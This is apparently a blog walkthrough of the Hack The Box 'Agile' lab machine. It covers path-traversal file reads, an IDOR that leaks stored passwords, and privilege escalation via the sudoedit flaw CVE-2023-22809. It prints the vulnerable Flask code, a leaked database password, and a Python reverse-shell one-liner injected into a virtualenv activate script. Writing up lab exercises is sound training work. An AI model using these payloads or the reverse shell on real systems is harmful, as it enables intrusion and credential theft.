---
title: Hack The Box - Agile - Medium Machine
published: true
---

# [](#Introduction) Introduction

**Agile** is a medium HackTheBox Linux machine, the user access was easy in my opinion but the LPE was harder. 

My work environment for hacking this machine:
- Ubuntu 20.04 LTS with some hacking tools installed
- An [Exegol](https://github.com/ThePorgs/Exegol) instance


## [](#User-Flag)User flag

### [](#Enumeration)Enumeration

There was nothing special about port scanning, only ssh and http ports were opened.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

There was nothing with Nikto too.

The website to attack was a password vault, one of the feastures was that an user could export its password vault at CSV format.


![](/assets/agile/vault.png)

Hmmm... LFI, are you there?

### [](#LFI)LFI 

So `http://superpass.htb/vault/export` was redirecting to `http://superpass.htb/download?fn=user_export_blablabla.csv`.

In this case, **fn** parameter was vunerable to Local File Inclusion.

```
http://superpass.htb/download?fn=../../../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum,1,1,:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

###  [](#SSH-Creds)SSH Credentials

From the LFI, I've tried to fuzzing directories and files in order to find some intereting data.

By reading **/proc/self/environ**, I've found /app/config_prod.json which gived us mysql creds for production database.

![](/assets/agile/proc_self_environ.png)

```json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

When a potential file that I was fuzzing didn't exist or was a directory, either ***FileNotFound*** or ***IsADirectory*** error were raised. 

After some time spent on guessing and fuzzing, I was convinced that this was a rabbit hole. The source of raised errors was `/app/app/superpass/views/vault_views.py`. 

```python
import flask
import subprocess
from flask_login import login_required, current_user
from superpass.infrastructure.view_modifiers import response
import superpass.services.password_service as password_service
from superpass.services.utility_service import get_random
from superpass.data.password import Password


blueprint = flask.Blueprint('vault', __name__, template_folder='templates')


@blueprint.route('/vault')
@response(template_file='vault/vault.html')
@login_required
def vault():
    passwords = password_service.get_passwords_for_user(current_user.id)
    print(f'{passwords=}')
    return {'passwords': passwords}


@blueprint.get('/vault/add_row')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def add_row():
    p = Password()
    p.password = get_random(20)
    #import pdb;pdb.set_trace()
    return {"p": p}


@blueprint.get('/vault/edit_row/<id>')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def get_edit_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.post('/vault/add_row')
@login_required
def add_row_post():
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        return ''

    p = password_service.add_password(site, username, password, current_user.id)
    return flask.render_template('vault/partials/password_row.html', p=p)


@blueprint.post('/vault/update/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def update(id):
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        flask.abort(500)

    p = password_service.update_password(id, site, username, password)

    return {"p": p}


@blueprint.delete('/vault/delete/<id>')
@login_required
def delete(id):
    password_service.delete_password(id)
    return ''


@blueprint.get('/vault/export')
@login_required
def export():
    if current_user.has_passwords:        
        fn = password_service.generate_csv(current_user)
        return flask.redirect(f'/download?fn={fn}', 302)
    return "No passwords for user"
    

@blueprint.get('/download')
@login_required
def download():
    r = flask.request
    fn = r.args.get('fn')
    with open(f'/tmp/{fn}', 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```

Focus on that line, there is a potential IDOR vulnerability which could lead us to other users' passwords.

```python
@blueprint.get('/vault/edit_row/<id>')
```

By fuzzing ID parameter in the following URL `http://superpass.htb/vault/edit_row/ID`, we can find potential useful creds...

![](/assets/agile/corum.png)


```
corum@agile:~$ id
uid=1000(corum) gid=1000(corum) groups=1000(corum)
corum@agile:~$ ls
user.txt
```

## [](#Root-Flag)Root flag

### [](#Corum)Corum
Like I said in the intro, LPE was tougher than user flag.

For our user ***corum***, there was nothing exploitable (priviledged rights, suid bits, cronjobs...).
However, two interesting services were active locally:
- Test version of the password vault app test.superpass.htb  on port **5555**.
- Chrome sandbox remote debugging on port **41829**.

I've decided to check the test version of superpass, but local port forwarding was needed to get an access for it.

Local port forwarding command for redrirecting test.superpass.htb locally to my port 8888:

```
ssh -L 8888:127.0.0.1:5555 corum@superpass.htb
```

Of course I've exploited the same IDOR which was present on production environment, and it permitted me to retrieve an other user's creds: edwards.

![](/assets/agile/edwards.png)


### [](#Edwards)Edwards

```
edwards@agile:~$ id
uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)
```
```
edwards@agile:~$ sudo -l

[...]

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt 
```

By checking CVE-2023-22809 and files owned by `dev_admin` group...

```
edwards@agile:~$ find / -group dev_admin 2>/dev/null
/home/dev_admin
/app/venv
/app/venv/bin
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
```
... we can confirm that dev_admin group owns /app/venv/activate file.

Therefore, by using these commands, we can also editing `/app/venv/bin/activate` by modifying `/app/config_test.json`

```
export EDITOR="nano -- /app/venv/bin/activate"
sudo -u dev_admin sudoedit /app/config_test.json
```

We can inject a reverse shell payload like following at the beginning of ```/app/venv/bin/activate```:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
And...

![](/assets/agile/root.png)


